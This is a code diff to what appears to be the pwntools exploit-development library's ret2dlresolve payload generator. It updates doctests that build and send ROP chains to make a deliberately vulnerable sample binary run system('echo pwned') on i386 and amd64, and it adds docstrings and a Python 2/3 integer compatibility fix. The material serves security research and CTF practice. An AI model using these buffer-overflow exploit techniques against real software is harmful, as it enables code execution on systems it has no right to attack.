@@ -2,65 +2,61 @@ r"""
 Provides automatic payload generation for exploiting buffer overflows
 using ret2dlresolve.
 
-Example:
+We use the following example program:
 
-    >>> program = tempfile.mktemp()
-    >>> source  = program + ".c"
-    >>> write(source, '''
-    ... #include <unistd.h>
-    ... void vuln(void){
-    ... 	char buf[64];
-    ... 	read(STDIN_FILENO, buf, 200);
-    ... }
-    ... int main(int argc, char** argv){
-    ... 	vuln();
-    ... }''')
-    >>> cmdline = ["gcc", source, "-fno-stack-protector", "-no-pie", "-m32", "-o", program]
-    >>> process(cmdline).wait_for_close()
+::
 
-    >>> context.binary = program
-    >>> elf = ELF(program)
-    >>> rop = ROP(elf)
+    #include <unistd.h>
+    void vuln(void){
+        char buf[64];
+        read(STDIN_FILENO, buf, 200);
+    }
+    int main(int argc, char** argv){
+        vuln();
+    }
+
+We can automate the  process of exploitation with these some example binaries.
+    
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('i386'))
+    >>> rop = ROP(context.binary)
     >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
     >>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
     >>> rop.ret2dlresolve(dlresolve)
     >>> raw_rop = rop.chain()
-    >>> print(rop.dump()) # doctest: +SKIP
-    0x0000:        0x8049030 read(0, 0x804ce00)
-    0x0004:        0x8049208 <adjust @0x10> pop edi; pop ebp; ret
+    >>> print(rop.dump())
+    0x0000:        0x80482e0 read(0, 0x804ae00)
+    0x0004:        0x80484ea <adjust @0x10> pop edi; pop ebp; ret
     0x0008:              0x0 arg0
-    0x000c:        0x804ce00 arg1
-    0x0010:        0x8049020 [plt_init] system(0x804ce30)
-    0x0014:           0x4b74 [dlresolve index]
+    0x000c:        0x804ae00 arg1
+    0x0010:        0x80482d0 [plt_init] system(0x804ae24)
+    0x0014:           0x2b84 [dlresolve index]
     0x0018:          b'gaaa' <return address>
-    0x001c:        0x804ce30 arg0
-    >>> p = process(program)
+    0x001c:        0x804ae24 arg0
+    >>> p = elf.process()
     >>> p.sendline(fit({64+context.bytes*3: raw_rop, 200: dlresolve.payload}))
     >>> p.recvline()
     b'pwned\n'
 
-    >>> # and now for 64 bits
-    >>> cmdline = ["gcc", source, "-fno-stack-protector", "-no-pie", "-o", program]
-    >>> process(cmdline).wait_for_close()
-    >>> context.binary = program
-    >>> elf = ELF(program)
+You can also use ``Ret2dlresolve`` on AMD64:
+
+    >>> context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get('amd64'))
     >>> rop = ROP(elf)
     >>> dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["echo pwned"])
     >>> rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like
     >>> rop.ret2dlresolve(dlresolve)
     >>> raw_rop = rop.chain()
-    >>> print(rop.dump()) # doctest: +SKIP
-    0x0000:         0x4011aa pop rdi; ret
+    >>> print(rop.dump())
+    0x0000:         0x400593 pop rdi; ret
     0x0008:              0x0 [arg0] rdi = 0
-    0x0010:         0x4011a8 pop rsi; pop r15; ret
-    0x0018:         0x404e00 [arg1] rsi = 4214272
+    0x0010:         0x400591 pop rsi; pop r15; ret
+    0x0018:         0x601e00 [arg1] rsi = 6299136
     0x0020:      b'iaaajaaa' <pad r15>
-    0x0028:         0x401030 read
-    0x0030:         0x4011aa pop rdi; ret
-    0x0038:         0x404e58 [arg0] rdi = 4214360
-    0x0040:         0x401020 [plt_init] system
-    0x0048:            0x318 [dlresolve index]
-    >>> p = process(program)
+    0x0028:         0x4003f0 read
+    0x0030:         0x400593 pop rdi; ret
+    0x0038:         0x601e48 [arg0] rdi = 6299208
+    0x0040:         0x4003e0 [plt_init] system
+    0x0048:          0x15670 [dlresolve index]
+    >>> p = elf.process()
     >>> p.sendline(fit({64+context.bytes: raw_rop, 200: dlresolve.payload}))
     >>> if dlresolve.unreliable:
     ...     p.poll(True) == -signal.SIGSEGV
@@ -69,6 +65,7 @@ Example:
     True
 """
 
+import six
 from copy import deepcopy
 
 from pwnlib.context import context
@@ -82,6 +79,7 @@ ELF32_R_SYM_SHIFT = 8
 ELF64_R_SYM_SHIFT = 32
 
 class Elf32_Rel(object):
+    ''
     """
     .. code-block:: c
 
@@ -103,6 +101,7 @@ class Elf32_Rel(object):
 
 
 class Elf64_Rel(object):
+    ''
     """
     .. code-block:: c
 
@@ -124,6 +123,7 @@ class Elf64_Rel(object):
 
 
 class Elf32_Sym(object):
+    ''
     """
     .. code-block:: c
 
@@ -158,6 +158,7 @@ class Elf32_Sym(object):
 
 
 class Elf64_Sym(object):
+    ''
     """
     .. code-block:: c
 
@@ -192,6 +193,7 @@ class Elf64_Sym(object):
 
 
 class Queue(list):
+    ''
     def size(self):
         size = 0
         for v in self:
@@ -205,10 +207,21 @@ class Queue(list):
 
 
 class MarkedBytes(bytes):
+    ''
     pass
 
 
 class Ret2dlresolvePayload(object):
+    """Create a ret2dlresolve payload
+
+    Arguments:
+        elf (ELF): Binary to search
+        symbol (str): Function to search for
+        args (list): List of arguments to pass to the function
+
+    Returns:
+        A ``Ret2dlresolvePayload`` object which can be passed to ``rop.ret2dlresolve``
+    """
     def __init__(self, elf, symbol, args, data_addr=None):
         self.elf = elf
         self.elf_load_address_fixup = self.elf.address - self.elf.load_addr
@@ -344,7 +357,7 @@ class Ret2dlresolvePayload(object):
             elif isinstance(top, bytes):
                 top = pack(self.data_addr + len(self.payload) + queue.size())
                 queue.append(MarkedBytes(queue[0]))
-            elif isinstance(top, int):
+            elif isinstance(top, six.integer_types):
                 top = pack(top)
 
             self.payload += top
